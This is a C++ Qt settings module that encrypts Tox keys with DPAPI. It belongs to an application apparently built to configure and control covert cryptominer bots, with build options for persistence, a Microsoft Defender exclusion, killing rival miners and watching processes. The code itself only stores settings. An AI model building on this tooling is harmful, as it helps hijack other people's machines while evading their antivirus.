#include "appsettings.h"

#include <QDebug>
#include <QSettings>

#ifdef Q_OS_WIN
#include <windows.h>
#include <dpapi.h>      // CryptProtectData / CryptUnprotectData

// DPAPI-encrypt a hex string → base64-encoded ciphertext stored in the registry.
// Returns an empty QString on failure. Callers MUST treat that as "do not
// write" rather than falling back to plaintext — a silent downgrade would
// mean the operator's Tox private key (savedata) hits the registry unencrypted
// and any process running as the same user can read it. Failure is rare
// (offline SID, roaming-profile corruption) but has to fail loud.
static QString dpapiProtect(const QString &plain)
{
    if (plain.isEmpty())
        return plain;
    const QByteArray utf8 = plain.toUtf8();
    DATA_BLOB in  = { (DWORD)utf8.size(), (BYTE *)utf8.constData() };
    DATA_BLOB out = {};
    if (!CryptProtectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out)) {
        qWarning() << "AppSettings: DPAPI CryptProtectData failed (LastError"
                   << GetLastError() << ") — refusing to store secret in cleartext";
        return QString();
    }
    const QByteArray cipher(reinterpret_cast<const char *>(out.pbData), out.cbData);
    LocalFree(out.pbData);
    return QString::fromLatin1(cipher.toBase64());
}

static QString dpapiUnprotect(const QString &cipher)
{
    if (cipher.isEmpty())
        return cipher;
    const QByteArray raw = QByteArray::fromBase64(cipher.toLatin1());
    DATA_BLOB in  = { (DWORD)raw.size(), (BYTE *)raw.constData() };
    DATA_BLOB out = {};
    if (!CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
        return cipher;   // return raw value if it was stored unencrypted (migration)
    const QString plain = QString::fromUtf8(reinterpret_cast<const char *>(out.pbData), out.cbData);
    LocalFree(out.pbData);
    return plain;
}
#else
static QString dpapiProtect(const QString &s)   { return s; }
static QString dpapiUnprotect(const QString &s) { return s; }
#endif

// Keys whose values are protected with DPAPI before hitting QSettings.
static bool isSensitiveKey(const QString &key)
{
    return key == Keys::ToxOperatorSavedata || key == Keys::ToxBotSavedata;
}

const QHash<QString, QVariant> &AppSettings::defaults()
{
    static const QHash<QString, QVariant> d = {
        { Keys::NetEndpoint,  QString() },
        { Keys::IdTox,        QString() },

        { Keys::ToxOperatorId,       QString() },
        { Keys::ToxOperatorSavedata, QString() },
        { Keys::ToxBotId,            QString() },
        { Keys::ToxBotSavedata,      QString() },
        { Keys::ToxBotName,          QString() },
        { Keys::ToxBots,             QStringLiteral("[]") },
        { Keys::ToxBotsHeaderState,  QString() },

        { Keys::MinerPool,      QString() },
        { Keys::MinerWallet,    QString() },
        { Keys::MinerPassword,  QString() },
        { Keys::MinerTls,       true },
        { Keys::MinerOnIdle,       true },
        { Keys::MinerOnActive,     false },
        { Keys::MinerIdleAfter,    5 },
        { Keys::MinerIdleEffort,   100 },
        { Keys::MinerActiveEffort, 50 },

        { Keys::UiAccent,     QStringLiteral("pink") },
        { Keys::UiAnimations, true },
        { Keys::UiTray,       true },
        { Keys::UiStartPage,  0 },

        { Keys::BuildConfigUrl,    QString() },
        { Keys::BuildWatchedProcesses, QString() },
        { Keys::BuildCpuEnabled,   true },
        { Keys::BuildGpuEnabled,   false },

        { Keys::ConfigUpdateMode, QStringLiteral("tox") },

        { Keys::BuildAdminManifest,        false },
        { Keys::BuildForeignMinerKiller,   false },
        { Keys::BuildDefenderExclusion,    false },
        { Keys::BuildDebugConsole,         false },
        { Keys::BuildPersistence,          false },

        { Keys::PetEnabled,   false },
        { Keys::PetScale,     100 },
        { Keys::PetSpeed,     1.0 },
        { Keys::PetFollow,    false },
        { Keys::PetChatter,   true },
        { Keys::PetOnTop,     true },
    };
    return d;
}

AppSettings *AppSettings::i()
{
    static AppSettings *inst = new AppSettings;
    return inst;
}

AppSettings::AppSettings(QObject *parent)
    : QObject(parent)
{
    QSettings s;
    const QHash<QString, QVariant> &d = defaults();
    for (auto it = d.constBegin(); it != d.constEnd(); ++it) {
        QVariant stored = s.value(it.key(), it.value());
        // Decrypt sensitive keys on the way in.
        if (isSensitiveKey(it.key()) && stored.userType() == QMetaType::QString)
            stored = dpapiUnprotect(stored.toString());
        m_cache.insert(it.key(), stored);
    }
}

QVariant AppSettings::get(const QString &key) const
{
    if (m_cache.contains(key))
        return m_cache.value(key);
    // Read-through for keys not cached at startup (legacy registry keys).
    QVariant stored = QSettings().value(key, defaults().value(key));
    if (isSensitiveKey(key) && stored.userType() == QMetaType::QString)
        stored = dpapiUnprotect(stored.toString());
    return stored;
}

void AppSettings::set(const QString &key, const QVariant &value)
{
    if (m_cache.contains(key) && m_cache.value(key) == value)
        return;

    // Encrypt sensitive keys before writing to QSettings / registry. If DPAPI
    // fails, dpapiProtect returns an empty QString — treat that as "do not
    // persist" so a Tox private key is never stored in cleartext. The cache
    // is still updated so the running app can use the value in-memory this
    // session, but nothing hits the registry until DPAPI recovers.
    QVariant toStore = value;
    bool persist = true;
    if (isSensitiveKey(key) && value.userType() == QMetaType::QString
        && !value.toString().isEmpty())
    {
        const QString protectedBlob = dpapiProtect(value.toString());
        if (protectedBlob.isEmpty()) {
            qWarning() << "AppSettings::set: not persisting" << key
                       << "— DPAPI protect failed (in-memory only this session)";
            persist = false;
        } else {
            toStore = protectedBlob;
        }
    }

    m_cache.insert(key, value);
    if (persist) {
        QSettings s; s.setValue(key, toStore); s.sync();
    }
    emit changed(key, value);
}

void AppSettings::remove(const QString &key)
{
    m_cache.remove(key);
    QSettings s; s.remove(key); s.sync();
    emit changed(key, QVariant());
}

void AppSettings::resetToDefaults()
{
    const QHash<QString, QVariant> &d = defaults();
    for (auto it = d.constBegin(); it != d.constEnd(); ++it)
        set(it.key(), it.value());
    // Remove orphan keys not in defaults (e.g. ToxBotsHeaderState, legacy)
    QSettings s;
    for (const QString &k : s.allKeys()) if (!d.contains(k) && k != Keys::ToxBots && k != Keys::ToxBotsHeaderState) {}
    s.sync();
}

QString AppSettings::storageLocation() const
{
    return QSettings().fileName();
}
